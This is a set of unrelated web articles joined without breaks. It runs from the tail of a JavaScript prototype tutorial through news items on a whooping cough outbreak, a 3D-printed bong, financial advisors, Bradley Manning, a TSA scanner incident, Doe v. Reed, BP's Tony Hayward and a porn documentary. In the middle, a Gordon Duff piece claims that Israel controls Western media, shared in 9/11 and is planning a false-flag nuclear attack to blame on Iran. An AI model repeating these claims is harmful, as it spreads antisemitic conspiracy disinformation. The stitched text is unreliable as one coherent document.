name = name ; } var a = new A ( ' alpha ' ) ; a.name ; //'alpha ' A.prototype.x = 23 ; a.x ; //23
But if I replace the prototype property with a new object , a .__proto__ still references the original object .
var A = function ( name ) { this .
name = name ; } var a = new A ( ' alpha ' ) ; a.name ; //' alpha ' A.prototype = { x:23} ; a.x ; //null
What does a default prototype look like ?
An object with one property , the constructor .
var A = function ( ) {} ; A.prototype.constructor == A ; //true var a = new A( ) ; a.constructor == A ; //true ( a's constructor property inherited from it's prototype )
What does instanceof have to do with prototype ?
The expression a instanceof A will answer true if A ’s prototype property occurs in a ’s prototype chain .
This means we can trick instanceof into failing
var A = function ( ) {} var a = new A ( ) ; a.__proto__ == A.prototype ; //true - so instanceof A will return true a instanceof A ; // true ; //mess around with a's prototype a.__proto__ = Function .
prototype ; //a's prototype no longer in same prototype chain as A's prototype property a instanceof A ; // false
So what else can I do with prototypes ?
Remember I said that every constructor has a prototype property which it uses to assign prototypes to all instances it generates ?
Well that applies to native constructors too such as Function and String .
By extending ( not replacing ! ) this property we get to update the prototype of every instance of the given type .
I ’ve used this technique in numerous previous posts to demonstrate function augmentation .
For example the tracer utility I introduced in my last post needed all string instances to implement times , which returns a given string duplicated a specified number of times
String.prototype.times = function ( count ) { return count &lt ; 1 ? '' : new Array ( count + 1 ) .join ( this ) ; } " hello ! " .times (3 ) ; //" hello!hello!hello ! " ; " please ..." . times (6 ) ; //" please...please...please...please...please...please ... "
Tell me more about how inheritance works with prototypes .
What ’s a prototype chain ?
Since every object and every prototype ( bar one ) has a prototype , we can think of a succession of objects linked together to form a prototype chain .
The end of the chain is always the default object ’s prototype .
a.__proto__ = b ; b.__proto__ = c ; c.__proto__ = {} ; //default object {}.__proto__.__proto__ ; //null
The prototypical inheritance mechanism is internal and non-explicit .
When object a is asked to evaluate property foo , JavaScript walks the prototype chain ( starting with object a itself ) , checking each link in the chain for the presence of property foo .
If and when foo is found it is returned , otherwise undefined is returned .
What about assigning values ?
Prototypical inheritance is not a player when property values are set .
a. foo = ‘ bar ’ will always be assigned directly to the foo property of a .
To assign a property to a prototype you need to address the prototype directly .
And that about covers it .
I feel I have the upper hand on the prototype concept but my opinion is by no means the final word .
Please feel free to tell me about errors or disagreements .
Where can I get more information on protoypes ?
I recommend this excellent article by Dmitry A. Soshnikov

A whooping cough epidemic has broken out in California , which is now facing what could be the largest outbreak of the contagious disease since 1958 .
Over 900 cases have been confirmed in the state — more than four times as many as last year — and 600 suspected cases are being investigated .
The highly contagious disease can be deadly to infants — five have already died from the disease this year in California — but it ’s eminently preventable through vaccination .
Officials are still investigating the causes of the outbreak , but some have already suggested that the anti-vaccine movement could be at least partly to blame .
“ California is the epicenter of vaccine refusal ” in the United States , said Dr. Blaise Congeni from Ohio ’s Akron Children ’s Hospital , according to an ABC News story .
While California requires that children be vaccinated from whooping cough before they attend school , “ the requirement is waived if parents file a ‘ personal belief exemption ’ ( PBE ) , which need not be based on religion or medical necessity , ” the story continues .
And some parents have been flocking to join the vaccine refusalists .
ABC News cites Ken August , spokesman for the California Department of Public Health :
He said that the overall rate for PBEs among the state ’s roughly 7,200 schools is about 2 percent .
But rates are much higher in some schools .
Records for 2009 indicated that close to 175 schools had PBE rates of 20 percent or more .
A few had rates above 70 percent .
Researchers have found that vaccination rates of at least 93 percent are needed to ensure so - called herd immunity against pertussis , which prevents the disease from spreading quickly to unvaccinated individuals .
Fears about vaccines are nothing new , but they ’ve been revived in recent years by anti-vaccine crusaders who ’ve junked science in favor of medical myths and conspiracy theories .
In the US and abroad , they ’ve popularized the notion that vaccines cause autism and that whooping cough is not actually fatal , among other falsehoods .
There ’s also the tireless conservative argument — promulgated by folks like the Eagle Forum ’s Phyllis Schlafly — that government - required vaccines infringe upon individual liberty .
The claims by leading anti-vaccine activists have been thoroughly debunked .
The US Court of Claims , for example , ruled last year that there was no substantive evidence to support the autism - vaccine link .
The main researcher behind the claim , British doctor Andrew Wakefield , has been completely discredited and even stripped of his medical license .
But there ’s still reason to be concerned about the damage that the movement may have already done .
Vaccine - phobia has gripped towns like Boulder , which in 2002 had the lowest school - wide vaccination rate in Colorado — and “ one of the highest per capita rates of whooping cough in the United States . ”
And now children in California are dying of a disease that should have been made obsolete by the 21st century .
If vaccine refusals are indeed behind the current epidemic , California needs to figure out the real reasons that parents are putting their own children and others at risk .*
* Post has been updated with this new sentence to underscore the fact that the causes of this outbreak are still unclear .
Thingiverse — a repository for user - created 3D meshes that can be fed to a 3D printer — has just had its first (? ) bong design uploaded , raising the question : if it 's illegal in some jurisdictions to own or sell a bong , will it become illegal to own or sell the 3D design for printing a bong on your desktop 3D fab ?
A note on the bong : MakerBong is a modular bong design that allows the smoker to design her own bong out of interlocking pieces , print them , and assemble to her satisfaction .
When we 're in a world where we can ( relatively ) instantly produce any object ourselves , is it the actual object that counts or the design ?
We like to think that 's the case for run -of - the - mill objects , since it's not the printing goop that 's important ; goop becomes commodity and the design rules .
Will our repositories be searched for the presence of " illegal objects " ?
Will repository operators ask submitters to delete suspected items for fear of the authorities ?
Will questionable content migrate from public repositories into private libraries run by secret cabals ?
Up Against the Wall and Spread Your Legs !

https://traffic.libsyn.com/goodfinancialcents/GFC_048_Fire_Financial_Advisor.mp3
You ’ve been working with a financial advisor for some time now , but now you ’re starting to have doubts that you hired the right person for the job .
Hopefully , you did a background check on them first , right ?
Is that financial planner more interested in helping you achieve your financial dream or just trying to sell you something ?
Too often people have handed their money over to a financial advisor without researching whether they were good or not .
Even worse is that when they suspect that they are not getting the service they deserve , they do n’t do anything about it .
If you have a suspect financial advisor , here are warning signs that you need to tell them , ” You ’re Fired , ” and move on .
1. They Still Do n’t Know Your Needs
If your financial advisor does n’t take the time to get to know your complete story , how can they possibly make a proper recommendation ?
Think if you went to your doctor , and before he or she even made a diagnosis , they were already suggesting you have surgery .
Would n’t you want a second opinion ?
I certainly hope so .
A real financial planner is going to take the time to ask the right questions :
How much credit card debt do you have ?
How is your health ?
How safe is your job ?
Do you want to buy a home ?
Do you have a will or trust ?
Do you have enough in your emergency fund ?
How do you plan to take care of your kids ’ college educations ?
When is the last time you checked your beneficiaries ?
Your advisor needs to know if it makes sense for you to invest , or if you should first take care of any pressing needs .
2. They Do n’t Tell You How They ’re Paid
There are many different ways that financial planners make money .
They may be commission - based , fee- only , fee - based — or a combination of the three .
Asking what the planner charges will help you to know exactly what you are paying throughout the working relationship .
If even after they explain it to you it does n’t make sense , have them put it in writing .
That way , you erase any doubt .
There is a cost associated with any investment that you make .
It is most likely that you will pay the advisor ’s fee or commission .
The advisor needs to be clear on what it ’s going to cost you .
3. They Make You Feel Rushed
If you feel like you are on the receiving end of a “ Boiler Room ” type sales pitch , you need to run — real fast .
When it comes to investing for your retirement , the last thing you want to be in is some investment that does not meet your needs .
You should never feel pressured to “ Act Now ” or else .
If that ’s the case , the only thing you need to act on is firing that financial advisor !
4. They Want to Put Everything in One Investment
While cliche , the old adage “ do n’t put all your eggs in one basket ” has a lot of merit .
I recently spoke with an individual that was moving out of state and wanted to find an advisor that would be local to him .
After further discussion and realizing his old advisor had barely serviced him , I asked how the advisor had him invested .
What I learned astonished me .
The advisor had invested him in the exact same fund for each of his 6 accounts ( Roth IRA ’s for him and his wife , joint account and 3 529 college savings plans for the kids ) .
If the mutual fund was decent , it would n’t have been much of an issue , but it really was n’t that good .
If your advisor is adamant about putting all your money into one investment , be wary .
Diversification is typically the basic fundamental principle of any investment portfolio .
If an advisor is trying to sway you into buying only one thing , he or she may have dollar signs ( i.e. commissions ) in their eyes and not your best interest .
5 . They Do n’t Inform You of Changes
If there are abrupt changes in the holdings of your portfolio , do you really want to hear about it by watching CNBC ?
You want to make sure your financial advisor is on top of your investments and looking out for you .
In some cases , you can give your advisor discretionary control where they can make trades on your behalf .
If that ’s the case , you still want to know what factors are leading the advisor to make an overhaul to your portfolio holdings .
Do n’t be in the dark about your retirement nest egg .
6 . They Do n’t Give You Legitimate Monthly Statements
I once had a Madoff - like occurrence in my very own backyard .
A client of mine had been investing through his 403b plan at work .
He thought he would investing through a reputable company and later found out that the advisor in charge never invested the funds .
He showed me the statement that was produced , and it was one of the best counterfeit statements I ’ve ever seen .
Your advisor should send you a monthly statement summarizing all that month ’s transactions , including deposits , withdrawals , and current positions held .
This statement must come directly from the brokerage firm or custodian that ’s holding your money , not from your advisor ’s office .
To use my firm as an example , we have custodial relationships with Fidelity , Charles Schwab , TD Ameritrade , and LPL Financial .
What that means is depending on which custodian we work with together is where you ’ll get your statements from .
Pro Tip : Let SmartAsset help you find the right advisor for you .
7 . They Do n’t Send You Quarterly & Annual Reports
At a minimum , you should receive quarterly and annual reports from your advisor .
Any less than that and I would start asking some questions .
These reports explain the return your advisor is getting on your investments , as well as all fees and commissions .
These reports should illustrate all the realized gains or losses ( all the money you actually made or lost from selling an investment ) and all the unrealized gains and losses ( investments you own but have not yet sold and thus that have not yet realized a profit or loss ) .
These reports should also include returns of the overall index .
You want to make sure you have a record of everything .
You should also look into getting online access .
That way , you can routinely check your account balances to make sure everything is on the up and up .
We utilize a third - party integration partner named Blueleaf that not only gives you up to the minute performance reporting of your accounts with us but also any of the outside accounts that you sync to it .
Do n’t get caught up in the day to day fluctuations , though .
8. Your Advisor Wants a Check Directly Made out to Him / Her
The ultimate warning sign is if the advisor asks you to write a check made out to him / her personally .
If the advisor asks you to write him a personal check , that is a clear red flag .
Never , ever , write out a check directly to the advisor .
Especially , if you are purchasing some kind of investment product .
In my home town , we had a financial advisor who was doing just that .
He had been a financial advisor for many years and was charged with financial exploitation of the elderly .
In one instance , he was trying to sell one of his clients an annuity .
She trusted her advisor and considered him a friend , so she wrote him a check .
A check directly to him , not the insurance company , in the amount of $ 20,000 .
Then he disappeared .
As it turns out , she was not the only client that had been taken advantage of .
Every check is to be payable to an institution .
As a registered investment adviser clients that want to invest with me will make the check payable to the custodian .
If they are paying me for a financial plan or for hourly planning , then they make a check payable to my previous firm , Alliance Wealth Management .
They never write the check to me .
9 . They Do n’t Know Your Risk Tolerance
Imagine you ’re comfortable with a portfolio that acts more like someone driving 55 mph , but your advisor has you invested more like someone trying to win the Daytona 500 .
Do you see a problem here ?
There are plenty of advisors that will ask you , “ On a scale 1 to 10 , how risky are you with investing ? ”
While that ’s a good conversation starter , in no way does that determine the appropriate risk for your investments .
10 . They Don’t Return Your Phone Call or Emails
One rule that I practice is that I return all of my clients ’ phone calls or emails within 24 hours .
It ’s challenging at times , but I put myself in their shoes and know I would not want to wait on getting answer .
I received a new client who was frustrated at her previous advisor .
She had called wanting to get some information on her investments and the advisor had yet to return her call … 5 days later .
Is there any question why that advisor got fired ?
“ CHATTER ” FLOWING IN FROM EVERYWHERE
“ SUITCASE ” NUKE SAID TO BE IN PLACE
By Gordon Duff STAFF WRITER / Senior Editor
Rumors of an upcoming terror attack to be blamed on Iran are moving around the world , “ backchannel chatter . ”
The primary suspect is Israel who is said to have a number of small “ suitcase ” type nuclear weapons , some primarily “ dirty bombs , ” possibly supplied secretly by a previous US administration .
These devices are in the “ 40 ton ” range , highly radioactive , extremely small and can be engineered to leave the signature of a primitive device .
They were originally designed for use against Soviet armor and troop concentrations in Europe if a massed attack on NATO were to occur .
Current conventional systems have made this type of weapon obsolete .
We have been told that federal authorities have interviewed , on video , a prominent individual with specific knowledge of the possession of this type of weapon .
This wo n’t be in the news .
All that “ every day folks ” will see is a story here or one there that do n’t make sense .
Why would “ ultra - Liberal ” Senator Chuck Schumer , nightmare “ anti- gun ” nut , extreme lefty and staunch New York democrat turn on the president ?
In fact , why are extreme liberals and conservatives all attacking President Obama and , less visibly , our military leaders , all at the same time ?
Who is orchestrating this oddest turn of political events in recent history ?
Why would the Pentagon ban Reverend Billy Graham ’s son from a prayer breakfast as an “ Islamophobe ? ”
Dad , the famous Reverend Billy Graham , primary spiritual advisor to every American president since Harry Truman held different views .
Rev. Billy Graham openly voiced a belief that Jews control the American media , calling it a “ stranglehold ” during a 1972 conversation with President Richard Nixon , according to a tape of the Oval Office meeting released Thursday by the National Archives .
“ This stranglehold has got to be broken or the country ’s going down the drain , ” the nation ’s best - known preacher declared as he agreed with a stream of bigoted Nixon comments about Jews and their perceived influence in American life .
“ You believe that ? ” Nixon says after the “ stranglehold ” comment .
“ Yes , sir , ” Graham says .
“ Oh , boy , ” replies Nixon .
“ So do I . I ca n’t ever say that but I believe it . ”
“ No , but if you get elected a second time , then we might be able to do something , ” Graham replies .
Consider this report as a form of “ innocualtion , ” meant to prevent an unseemly accident .
EVER WONDER WHY OVER 80 % OF AMERICAN’S DON’T TRUST CONGRESS ?
[ youtube 3BahjX9nI5 k ]
FACE THE FACTS
Israel has never been in more trouble today , not from any imaginary Arab armies or a “ holocaust ” from Iran , a country with only minor defensive weaponry , a 4th rate military power , for those who really pay attention to these things .
Israel has gotten in trouble because of “ chickens coming home to roost . ”
Americans and Europeans have been conditioned by the press , yes , Israel controls the press in the US , Europe , Australia , New Zealand and elsewhere , to ignore ethnic cleansing and war crimes in Palestine .
Years of news and “ infotainment ” along with movies and TV series , always depicting Palestinians as crazed murders has done its job , covered mass murder in ways that Josef Goebbels could never do for Hitler .
Things started to go wrong for Israel when top military leaders became increasingly suspicious of 9/11 .
None will openly admit to it , but as years have gone on , and Iraq and Afghanistan could no longer be called real security issues for the US , an unspoken movement toward lending a suspicious eye to Israeli involvement in 9/11 has festered .
Israel ’s hand in propagandizing our news has become too obvious for trained observers to miss , with the direction not “ pro-Israel ” but looking more like a country covering for crimes .
This is the potential list :
Possible complicity in some part of 9/11 with or without help from groups in the US and one other Middle Eastern nation known to secretly finance Israeli operations but pretending to be a “ blood enemy ” of the Jews
Israeli complicity in massive financial crimes in the US , including engineering of the sub - prime mortgage collapse as an operation meant to destabilize the United States .
That current financial reforms meant to prevent a repeat of this , pushed by President Obama ( and military leaders ) is opposed by groups financed by the Israeli lobby is a “ smoking gun . ”
Terrorist attacks in Iraq , Russia , Iran and Pakistan carry clear signs of involvement of one or more intelligence agencies being involved , among them Israel .
Israeli political machinations backed by a massive propaganda and disinformation campaign attempting to justify an unprovoked attack on Iran , disinformation including “ holocaust ” rhetoric and clearly falsified intelligence on Iran ’s non-existent nuclear program are an almost perfect repeat of the same operation that pushed the Bush administration to mistakenly attack Iraq .
Note this classic example of disinformation propaganda , conditioning “ the west ” to expect a dirty bomb attack : Debka / Israel Hoax and , more “ cover ” still from Israeli stooge Mikhail Saakashvili .
The “ Israel Project ” actually has run ad advertisement warning of exactly such an attack .
You can see an RT ( Russia Television ) video about this video , labeled “ crazy ” and “ propaganda . ”
A national survey mentioned indicates that 70 % of the American people because of Israeli propaganda , now believe Iran currently has nuclear weapons .
Many prominent lawmakers advise “ the Israel Project , ” a group with no other purpose than to condition Americans to expect terror attacks and to “ pre-blame ” Iran .
Nuclear threats made by “ extremists ” in Israel against Western Europe went unheeded and the desired outcry of support for an attack on Iran never materialized .
Israel would never have allowed prominent sources in its defense establishment to voice “ crazy threats ” to “ nuke Rome ” unless some purpose were served .
Highly orchestrated attacks on the Obama administration , now finally working in close association with top military leaders , is meant to destabilize the US .
Moving threats against the US , the engineering of a new market collapse by Goldman Sachs , an ineffective attack by Israel on Iran , cutting off all oil to the west or attempts by Israeli controlled media giants to forment civil unrest in the US are all “ on the table ” and being pushed forward .
AMERICAN POLITICIANS , PRESIDENT OBAMA INCLUDED ARE “ SWORN ” TO KEEP ISRAEL’S VAST NUCLEAR ARSENAL THE WORLD’S “ WORST KEPT SECRET ”
[ youtube NsjbV23cto8 ]
HOW AMERICA’S MILITARY HAS CHANGED
The deteriorating situation in Iraq and Afghanistan have tied down so many resources that our defense capabilities , the contingency response that our defense planners have spent years creating and over a trillion dollars financing is a shambles .
We are trucking supplies hundreds of miles through enemy territory to resupply in Afghanistan , that and flying everything thousands of miles across Russia followed by more trucking , hundreds of miles across enemy territory again .
In the process , we are paying hundreds of millions of dollars a year to our own enemies , simply to keep ourselves in Twinkies and Ho Hos .
America is saddled with an incompetent and corrupt ally who has hopelessly embroiled us in his endless and ineffective plots , all with a massive subtext of drug dealing , selling weapons to the enemy and double dealing with foreign intelligence services .
How we got here is no secret and military leaders are unhappy .
America got herself led into these disasters for the good of , not Israeli security but a series of intrigues , more like a chess match , playing country against country , while raking in cash selling weapons to everyone , including the US and India , but , less overtly , to Iran and the Taliban as well .
These are some of the worst kept secrets in the world .
Even President Obama knows , heaven forbid .
ONLY A NEW 9/11 CAN BAIL ISRAEL OUT
With massive control of news organization , half our top retired military leaders taking regularly paid “ junkets ” to Israel and 363 members of congress indicating an “ unbreakable bond ” with Israel , no matter what they are caught doing , and they have been caught so many times , starting with the 1956 Suez / Sinai invasion , the 1967 USS Liberty attack , which helped Israel sell the idea that they were attacked when quite the opposite is true , the belief is that that a new “ false flag ” attack can be covered easily .
Who could blame Israel , poor beleaguered country , the only “ democracy ” in the Middle East surrounded by vicious and dirty Arabs trying to sneak in and cut throats of small children in school ?
We have already seen the stories about Iran ’s planned “ holocaust ’ and how they are going to invade Israel , a technical impossibility ” and set up gas chambers , start making soap and lamp shades out of Jews .
If anything warns America that an attack is coming , hearing both “ holocaust ” and seeing Charles Schumer attacking a democratic president should be warning enough .
The rumors are that the weapons are in place in Europe and the US .
“ The usual suspects , ” Arabs , Persians , Pakistanis , some kind of Islamic terrorist group has either been recruited , invented or is being thawed out .
News stories are in place and with 9/11 , film crews are ready to be onsite .
Witnesses will be briefed , all to say , “ yes it was an Arab dirty bomb , we saw them , Middle Eastern looking , they must have bought it from North Korea . ”
That kind of story would hit the news within seconds from “ stunned survivors ” who will suddenly disappear , returning quickly to “ you know where . ”
Glenn Beck will cry .
LIBERALS AND CONSERVATIVES HAVE ALWAYS GOTTEN MARCHING ORDERS FROM TEL AVIV
Americans have the rare privilege of seeing the GOP , NRA , Fox News and the Tea Baggers aligned with 250 or is it 300 or 400 , we are n’t sure , members of congress that have signed a letter promising to support Israel , in this case , against the interests of the United States .
The names of those involved is difficult to find .
A search of 100 stories on this subject has failed to give a list .
Blog after blog is requesting the list of those who signed the letter but even Israeli papers do n’t print it .
Sites claiming to list the members signing now show “ FORBIDDEN ” or “ NO LONGER AVAILABLE . ”
What we do know is that congress ’s most liberal members , those most outspoken for gun control and all of those listed by the Tea Bag movements and GOP as the most liberal and “ unpatriotic ” of our politicians are now lined up with the supporters of Goldman Sachs and all , the most conservative and most liberal , are signed up against the President and the Pentagon , aligned with Israel .
For those with eyes to see and ears to hear , the entire “ liberal ” and “ conservative ” political hoopla of the last few years is turning out to be a subterfuge to keep Americans from uniting together to regain control of their own country , a control that , for awhile , ran our military , our intelligence services and even the oval office .
Now it runs only Congress , no party , just those addicted to AIPAC / Israeli funding more than allegiance to the United States of America .
What they may earn us through this “ moral flexibility ” and indifference to allegiance to their own country is another major terrorist attack .
These same members of congress will receive the call , be told how to vote , what to say and exactly what they get in return , same as with Iraq .
Ah , the foibles of living in a democracy for sale to the highest bidder !

Wired News senior editor ( and former hacker ) Kevin Poulsen and reporter Kim Zetter have unveiled the identity of an Army intelligence analyst arrested over charges that he provided Wikileaks with the " Collateral Murder " video .
Snip from the extensive Wired News item :
SPC Bradley Manning [ at left ] , 22 , of Potomac , Maryland , was stationed at Forward Operating Base Hammer , 40 miles east of Baghdad , where he was arrested nearly two weeks ago by the Army 's Criminal Investigation Division .
A family member says he 's being held in custody in Kuwait , and has not been formally charged .
Manning was turned in late last month by a former computer hacker with whom he spoke online .
In the course of their chats , Manning took credit for leaking a headline - making video of a helicopter attack that Wikileaks posted online in April .
The video showed a deadly 2007 U.S. helicopter air strike in Baghdad that claimed the lives of several innocent civilians .
That " former hacker , " now said to be a US government informer , is Adrian Lamo ( seen in this photo with Poulsen ) .
You may remember Lamo 's name from the big legal case surrounding his break - ins to computer networks at The New York Times , Microsoft , Yahoo ! , and MCI WorldCom .
He cut a deal with the Feds in 2004 to avoid prison time .
He was recently institutionalized with Asperger 's ( as reported by Poulsen , for Wired ) , and has previously been accused of stalking a former girlfriend .
Mr. Lamo is said to identify himself now as an " award - winning journalist . "
The Wired story hit late Sunday .
Today , the Defense Department confirmed Manning 's arrest and detention in Kuwait over claims he " leaked classified information . "
Again , from Wired News :
" United States Division - Center is currently conducting a joint investigation " says the statement , which notes that Manning is deployed with 2nd Brigade 10th Mountain Division in Baghdad .
" The results of the investigation will be released upon completion of the investigation . "
Wikileaks apparently did n't respond to Wired News requests for comment before the story ran , but they did reply publicly to the story on Twitter …

Perhaps the new airport body scanners are a bit too revealing .
A TSA worker in Miami was arrested for aggravated battery after police say he attacked a colleague who'd made fun of his small genitalia after he walked through one of the new high - tech security scanners during a recent training session .
Rolando Negrin , 44 , was busted for assault after things got ugly at Miami International Airport between Negrin and some of his fellow Transportation Security Administration workers on Tuesday .
Sources say Negrin stepped into the machine during the training session and became embarrassed and angry when a supervisor started cracking jokes about his manhood , made visible by the new machine .
According to the police report , Negron confronted one of his co-workers in an employee parking lot , where he hit him with a police baton on the arm and back .
" [ Negron ] then told victim to kneel down and say ' your sorry , ' " the report reads .
" Victim stated he was in fear and complied with [ Negron ] . "
Negron was arrested the next day when he arrived for work .
He told police he had been made fun of by coworkers on a daily basis .

The attack may be the first piece of proof that the new scanners may be leaving too little to the imagination .
The $ 170,000 machines , which were introduced last year , took some heat from fliers who were n't quite ready to show their bod to government employees .
But if this latest incident is any indication , the scanners sound like good news for anti-terrorism and bad news for less - than - average men .
The New York Times will begin charging for access to articles on its website in January , Bill Keller , executive editor of the newspaper , said at a dinner for the Foreign Press Association Thursday evening .
New York Times Co. unveiled a plan early this year to begin charging for access to the Web version of its flagship newspaper .
Mr. Keller 's comments helped pinpoint the timing of the plan .

The Supreme Court ruled 8 - 1 today that , despite “ threats ” of violence and antagonism , Washington State ’s residents who lent their names to put Referendum 71 on the ballot , which let voters choose to uphold the state ’s “ everything but marriage ” law , must let their identities be know .
Disclosing them does not violate the 138,000 petitioners ’
First Amendment rights , the justices ruled , updating their decision to stay the Ninth Circuit ’s ruling to make the names public .
The Court ’s ruling in Doe v. Reed is the latest blow for Protect Marriage Washington , which organized the signature drive to get Ref 71 on the ballot — only to see voters uphold Washington State ’s domestic partnership law .
( State Attorney General Rob McKenna , who took heat for opposing taxpayer - funded sex change operations , gets a jock nod for successfully arguing the case . )
Only Clarence Thomas voted to keep the names secret .
He says a citizen ’s privacy rights trump transparency in politics .
But it ’s not just Washington ’s gay foes that will see the consequences of the ruling ; it “ could have far - reaching impacts , not just on the state ’s initiative and referendum process , but also for other “ open government ” laws like the disclosure of who contributes to political campaigns , and how much they give , ” notes the Seattle Post Intelligencer .
In the immediate , however , it ’s a definitive message that knocks down the silly and irresponsible arguments from opponents of gay marriage , who say democracy should happen in secret .
No longer will these individuals be able to deny rights to Americans without being held publicly accountable .
This is a good decision .
This is a good day .

EMPIRE , La. -- BP chief executive Tony Hayward took a day off Saturday to see his 52 - foot yacht " Bob " compete in a glitzy race off England 's shore , a leisure trip that further infuriated residents of the oil - stained Gulf Coast .
While Hayward 's pricey ship whipped around the Isle of Wight on a good day for sailing -- breezy and about 68 degrees -- anger simmered on the steamy Gulf Coast , where crude has been washing in from the still - gushing spill .
" Man , that ai n't right .
None of us can even go out fishing , and he's at the yacht races , " said Bobby Pitre , 33 , who runs a tattoo shop in the crossroads town of Larose , La .
" I wish we could get a day off from the oil , too . "
BP spokespeople rushed to defend Hayward , who has drawn withering criticism as the public face of BP PLC 's halting efforts to stop the worst offshore oil spill in U.S. history .
Company spokesman Robert Wine said the break is the first for Hayward since the Deepwater Horizon rig BP was leasing exploded April 20 , killing 11 workers and setting off the undersea gusher .
" He 's spending a few hours with his family at a weekend .
I 'm sure that everyone would understand that , " Wine said .
He noted Hayward is a well known as a fan of the J.P. Morgan Asset Management Round the Island Race , one of the world 's largest , which attracts more than 1,700 boats and 16,000 sailors as famous yachtsmen compete with wealthy amateurs in a 50 - nautical mile course around the island at England 's southern tip .
" Bob " finished fourth in its group .
It was not clear whether Hayward actually took part in Saturday 's race or attended as a spectator .
The boat , made 10 years ago by the Annapolis , Md. - based boatbuilder Farr Yacht Design , lists for nearly $ 700,000 .
Hayward had already angered many in the U.S. when he was quoted in the Times of London as suggesting that Americans were particularly likely to file bogus claims for compensation from the spill .
He later shocked Louisiana residents by telling them that no one wanted to resolve the crisis as badly as he did because " I 'd like my life back . "
Ronnie Kennier , a 49 - year - old oysterman from Empire , La. , said Hayward 's day among the sailboats showed once again just how out of touch BP executives are with the financial and emotional suffering along the Gulf .
" He wanted to get his life back , " Kennier said .
" I guess he got it . "
In Washington , President Barack Obama 's chief of staff Rahm Emanuel made the same observation Saturday on ABC's " This Week . "
Obama and Vice President Joe Biden enjoyed a round of golf Saturday near Washington , something they 've done on other weekends since the spill and a fact that was n't lost on users of social networking sites .
Twitter feeds compared Obama and Biden 's golfing to Hayward 's yachting , lumping them together as diversions of privileged people who should be paying more attention to the oil gushing into the Gulf .
" Our government , the executives at BP , it looks like they decide to worry about it later , " said Capt .
Dwayne Price , a charter fisherman in Grand Isle , La. , who now spends his days shuttling media out to the oiled waters .
" Things need to happen now .
The longer this is strung out , the worse it 's going to be . "
Messages seeking comment were left for officials at the White House , who have struggled to counter criticism at home of how the administration has handled the disaster .
An Associated Press - GfK poll released Tuesday showed 52 percent now disapprove of Obama 's handling of the oil spill , up significantly from last month .
BP , Britain 's largest company before the oil rig exploded , has lost about 45 percent of its value since the explosion -- a drop that has alarmed millions of British retirees whose pension funds hold BP stock .
Just this week , the company announced that it was canceling its quarterly dividend .
The British press , much more sympathetic than the American media to BP 's plight , has expressed disbelief at the company 's strategy .
" It is hard to recall a more catastrophically mishandled public relations response to a crisis than the one we are witnessing , " the Daily Telegraph 's Jeremy Warner wrote Friday .
About 50 miles off the coast , a newly expanded containment system is capturing or incinerating more than 1 million gallons of oil daily , the first time it has approached its peak capacity , according to the Coast Guard .
BP hopes that by late June it will be able to keep nearly 90 percent of the flow from the broken pipe from hitting the ocean .
More than 120 million gallons have leaked from the well , according to the most pessimistic federal daily flow rate estimates .
Oil has been washing up from Louisiana to Florida , killing birds and fish , coating delicate marshes and wetlands and covering pristine beaches with tar balls .
A pair of relief wells considered the best chance at a permanent fix wo n't be done until August .
BP has put many idled commercial fishermen to work on the cleanup .
But not everyone .
Sai Stiffler spent Saturday doing some repairs on his shrimp boat at Delta Marina in Empire , La. , after a passing shower made things stiflingly hot and muggy .
He signed up for BP's " vessel of opportunity " program but has n't been hired , and he was not pleased that Obama was playing golf and BP 's CEO was at a yacht race while his life is on hold .
" Right now is no time for that , " Stiffler said .
" I do n't think they know how bad people are hurting .
They make a lot of promises but that 's it . "
Raymond Canevari , 59 , of Pensacola , said he was insulted by the fact that Hayward would take in a yacht race while the oil still flows .
" I think everyone has the right to do what they want in their free time , but he does n't have the right to have free time at all , " said Canevari , who scouts the bayous , bays and Gulf for driftwood and other found objects , and turns the debris into nature - themed art .
" Not until this crisis is resolved . "
Yesterday I attended the premiere of the documentary Exxxit : Life After Porn .
I learned some disturbing things about what it 's like to have sex on camera — and to stop .
Director Bryce Wagoner — whom Sean Macaulay quoted for his Daily Beast piece on post - porn life — turned up several common threads in his interviews with performers and ex-performers .
Many got into porn in a sort of sidelong fashion , starting with modeling or stripping , and many were attracted by the offer of good money for fairly short hours .
Once in the industry , some grew to love the attention .
Ex-porn star Houston says she became so used to marketing her celebrity status that when she got a labiaplasty , it was a no - brainer to encase her labia " trimmings " in lucite and sell them .
Advertisement
Others , however , were n't so comfortable .
Crissy Moran speculates that she was popular in her performing days precisely because she was n't confident in front of the camera .
And a significant number of performers reported abusive childhoods , and addiction issues that appeared or worsened during their time in porn .
Some also described porn as a way to counteract early self - esteem issues — ex-star Richard Pacheco said people once teased for their weight " are the people that become centerfolds , because they 've got something to prove . "
But those who leave porn face a new kind of stigma .
Houston heart - wrenchingly described being fired from her job because she was " too recognizable " — right before she was diagnosed with cancer .
Former porn star Asia Carrera joined Mensa , but had to make a new website with no mention of her porn career before their site would link to her .
She also moved to Utah and went by a different surname , but still encountered people who had dug up her past .
Porn director Bill Margold summed up the hypocrisy of a country willing to consume porn but not to accept its performers : these performers , he said , were " blighted by a society that jacked off to them . "
Advertisement
During the Q&A after the show , I asked Wagoner and some of his subjects what the solution was .
I was curious not just about how to relieve the stigma porn stars and ex-porn stars face , but also how to fix an industry many ex-performers looked back on as degrading .
Several former stars in the film were so disturbed by their time in the business that they joined anti-porn campaigns like XXX Church , but I wondered if there was a way to make porn more humane for its performers rather than rejecting it entirely .
Bill Margold mentioned his work for the organization Protecting Adult Welfare ( their goal : " improving the quality of life for the workers in the adult entertainment industry [...] as well as improving an understanding of our industry by the public at large " ) , and stressed the need for a safety net for porn stars in crisis , " a place where when the star crashes and burns they can go for sanctuary . "
But how to prevent performers from crashing and burning in the first place ?
Advertisement
One clue comes from self - described feminist porn star Nina Hartley ( pictured , although not from premiere ) .
While many of Wagoner 's subjects got into the business for the money or because of lack of other options , Hartley started in porn because she " had something to say about sex . "
During the Q&A , she explained , " I'm a nurse , and in our culture sexuality is sick " ( she is , in fact , an RN ) .
Hartley continues to act in porn and was a ray of sunshine in an otherwise downbeat documentary , perhaps because unlike many of the performers featured , she has made a career doing what she genuinely loves .
Still , it 's not easy for a woman in our society to own an exhibitionist sexuality ( Hartley also describes herself as an exhibitionist and a voyeur ) , and there may always be those who prefer to watch someone " uncomfortable " in front of the camera , like Moran , rather than someone who clearly loves being there .
One reason porn performers are so denigrated is that our culture still prizes unwilling or faux - unwilling female sexual partners , and this will have to change before those who willingly have sex for money gain full acceptance .
On thing Exxxit did n't really address was the rise of Internet porn and its depression of porn stars ' salaries .
For better or for worse , in the coming years fewer and fewer people will go into porn because they can make a week 's salary in a day .
